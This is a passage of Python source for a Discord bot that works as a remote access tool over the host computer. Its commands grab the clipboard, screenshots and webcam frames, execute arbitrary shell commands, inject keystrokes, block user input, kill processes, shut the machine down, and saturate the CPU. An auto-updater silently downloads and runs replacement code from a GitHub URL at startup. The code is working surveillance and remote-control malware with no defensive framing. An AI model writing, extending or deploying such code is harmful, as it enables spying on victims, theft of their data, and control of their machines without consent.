
@bot.command(name="idle")
async def idle_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    if sys.platform != "win32": return await ctx.send(" Windows only.")
    try:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        seconds = millis // 1000
        mins, secs = divmod(seconds, 60)
        hours, mins = divmod(mins, 60)
        await ctx.send(f" Idle for: `{hours}h {mins}m {secs}s`")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="procs")
async def procs_prefix(ctx, *, filter: str = ""):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    results = []
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            if filter.lower() in proc.info["name"].lower():
                results.append(f"{proc.info['pid']:>6}  {proc.info['name']}")
        except Exception:
            pass
    if not results: return await ctx.send("No matching processes found.")
    output = "\n".join(results[:50])
    if len(results) > 50: output += f"\n...and {len(results) - 50} more"
    await ctx.send(f"```\n{'PID':>6}  NAME\n{output}\n```")

@bot.command(name="clip")
async def clip_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    try:
        if sys.platform == "win32":
            result = subprocess.run(["powershell", "-Command", "Get-Clipboard"], capture_output=True, text=True)
        else:
            result = subprocess.run(["xclip", "-selection", "clipboard", "-o"], capture_output=True, text=True)
        content = result.stdout.strip() or "(clipboard is empty)"
        if len(content) > 1900: content = content[:1900] + "\n...(truncated)"
        await ctx.send(f" Clipboard:\n```\n{content}\n```")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="ss")
async def ss_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await ctx.send(file=discord.File(buf, filename="screenshot.png"))
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="cam")
async def cam_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return await ctx.send(" No webcam found.")
        ret, frame = cap.read()
        cap.release()
        if not ret: return await ctx.send(" Failed to capture.")
        _, buf = cv2.imencode(".png", frame)
        await ctx.send(file=discord.File(io.BytesIO(buf.tobytes()), filename="cam.png"))
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="run")
async def run_prefix(ctx, *, command: str):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout or result.stderr or "(no output)"
        if len(output) > 1900: output = output[:1900] + "\n...(truncated)"
        await ctx.send(f" `{command}`\n```\n{output}\n```")
    except subprocess.TimeoutExpired:
        await ctx.send(" Timed out after 30s.")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="open")
async def open_prefix(ctx, *, path: str):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    try:
        if sys.platform == "win32": os.startfile(path)
        elif sys.platform == "darwin": subprocess.Popen(["open", path])
        else: subprocess.Popen(["xdg-open", path])
        await ctx.send(f" Opened: `{path}`")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="kill")
async def kill_prefix(ctx, *, name: str):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    killed = []
    for proc in psutil.process_iter(["pid", "name"]):
        if name.lower() in proc.info["name"].lower():
            try:
                proc.kill()
                killed.append(f"{proc.info['name']} (PID {proc.info['pid']})")
            except Exception:
                pass
    if killed:
        await ctx.send(" Killed:\n" + "\n".join(f"- `{k}`" for k in killed))
    else:
        await ctx.send(f" No process matching `{name}`")

@bot.command(name="type")
async def type_prefix(ctx, *, text: str):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    try:
        import pyautogui
        pyautogui.write(text, interval=0.05)
        await ctx.send(f" Typed: `{text}`")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="vol")
async def vol_prefix(ctx, level: int):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    if not 0 <= level <= 100: return await ctx.send(" Must be 0-100.")
    try:
        if sys.platform == "win32":
            script = (f"$volume = {level / 100};" "$obj = New-Object -ComObject WScript.Shell;" "1..50 | % { $obj.SendKeys([char]174) };" f"$steps = [math]::Round($volume * 50);" "1..$steps | % { $obj.SendKeys([char]175) }")
            subprocess.run(["powershell", "-Command", script], capture_output=True)
        else:
            subprocess.run(["amixer", "-D", "pulse", "sset", "Master", f"{level}%"])
        await ctx.send(f" Volume set to `{level}%`")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="notify")
async def notify_prefix(ctx, *, message: str):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    try:
        if sys.platform == "win32":
            script = f"""
[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.UI.Notifications.ToastNotification, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
$template = [Windows.UI.Notifications.ToastTemplateType]::ToastText02
$xml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent($template)
$text = $xml.GetElementsByTagName('text')
$text[0].AppendChild($xml.CreateTextNode('Bot Alert')) | Out-Null
$text[1].AppendChild($xml.CreateTextNode('{message}')) | Out-Null
$toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Windows PowerShell').Show($toast)
"""
            subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", script], capture_output=True)
        else:
            subprocess.run(["notify-send", "Bot Alert", message])
        await ctx.send(f" Notification sent: `{message}`")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="wallpaper")
async def wallpaper_prefix(ctx, url: str):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    try:
        path = os.path.join(os.environ.get("TEMP", "/tmp"), "wallpaper.jpg")
        urllib.request.urlretrieve(url, path)
        if sys.platform == "win32":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        await ctx.send(" Wallpaper changed!")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command(name="lock")
async def lock_prefix(ctx, seconds: int = 5):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    if sys.platform == "win32":
        result = ctypes.windll.user32.BlockInput(True)
        if result:
            msg = " Input locked."
            if seconds > 0: msg += f" Auto-unlocking in {seconds}s."
            await ctx.send(msg)
            if seconds > 0:
                await asyncio.sleep(seconds)
                ctypes.windll.user32.BlockInput(False)
                await ctx.send(" Input auto-unlocked.")
        else:
            await ctx.send(" Failed  run as Administrator.")

@bot.command(name="unlock")
async def unlock_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    if sys.platform == "win32":
        ctypes.windll.user32.BlockInput(False)
        await ctx.send(" Input unlocked.")

@bot.command(name="shutdown")
async def shutdown_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    await ctx.send(" Shutting down...")
    subprocess.run(["shutdown", "/s", "/t", "5"] if sys.platform == "win32" else ["shutdown", "-h", "now"])

@bot.command(name="reboot")
async def reboot_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    await ctx.send(" Rebooting...")
    subprocess.run(["shutdown", "/r", "/t", "5"] if sys.platform == "win32" else ["reboot"])

@bot.command(name="freeze")
async def freeze_prefix(ctx, seconds: int = 5):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    await ctx.send(f" Freezing for `{seconds}s`...")
    burn_code = "import math\nwhile True:\n math.factorial(100000)"
    procs = [subprocess.Popen([sys.executable, "-c", burn_code], creationflags=subprocess.CREATE_NO_WINDOW) for _ in range(os.cpu_count() or 4)]
    await asyncio.sleep(seconds)
    for p in procs:
        try: p.kill()
        except: pass
    await ctx.send(" Done freezing.")


# 
# AUTO-UPDATER
# 
UPDATE_URL = "https://raw.githubusercontent.com/Exly78/GugaBot/main/Bot.py"

def check_update():
    try:
        import urllib.request
        _dir = os.path.dirname(os.path.abspath(__file__))

        # Update Bot.py
        with urllib.request.urlopen("https://raw.githubusercontent.com/Exly78/GugaBot/main/Bot.py") as r:
            remote = r.read()
        with open(os.path.abspath(__file__), "rb") as f:
            local = f.read()

        # Always re-download token.enc in case token was rotated
        with urllib.request.urlopen("https://raw.githubusercontent.com/Exly78/GugaBot/main/token.enc") as r:
            with open(os.path.join(_dir, "token.enc"), "wb") as f:
                f.write(r.read())

        if remote != local:
            print("[*] Update found, applying...")
            with open(os.path.abspath(__file__), "wb") as f:
                f.write(remote)
            print("[*] Updated. Restarting...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print("[OK] Already up to date.")
    except Exception as e:
        print(f"[!] Update check failed: {e} | URL: {UPDATE_URL}")

# Check for update on startup
check_update()

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f" Logged in as {bot.user} | Slash commands synced")


#  /update 
@bot.tree.command(name="update", description="Force check for bot updates")
async def update(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.send_message(" Checking for updates...")
    try:
        import urllib.request
        with urllib.request.urlopen(UPDATE_URL) as r:
            remote = r.read()
        with open(os.path.abspath(__file__), "rb") as f:
            local = f.read()
        if remote != local:
            await interaction.followup.send(" Update found! Applying and restarting...")
            with open(os.path.abspath(__file__), "wb") as f:
                f.write(remote)
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            await interaction.followup.send(" Already up to date.")
    except Exception as e:
        await interaction.followup.send(f" Error: {e}")

@bot.command(name="update")
async def update_prefix(ctx):
    if not authorized(ctx.author.id):
        return await ctx.send(" You're not authorized.")
    await ctx.send(" Checking for updates...")
    try:
        import urllib.request
        with urllib.request.urlopen(UPDATE_URL) as r:
            remote = r.read()
        with open(os.path.abspath(__file__), "rb") as f:
            local = f.read()
        if remote != local:
            await ctx.send(" Update found! Applying and restarting...")
            with open(os.path.abspath(__file__), "wb") as f:
                f.write(remote)
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            await ctx.send(" Already up to date.")
    except Exception as e:
        await ctx.send(f" Error: {e}")


# 
bot.run(BOT_TOKEN)
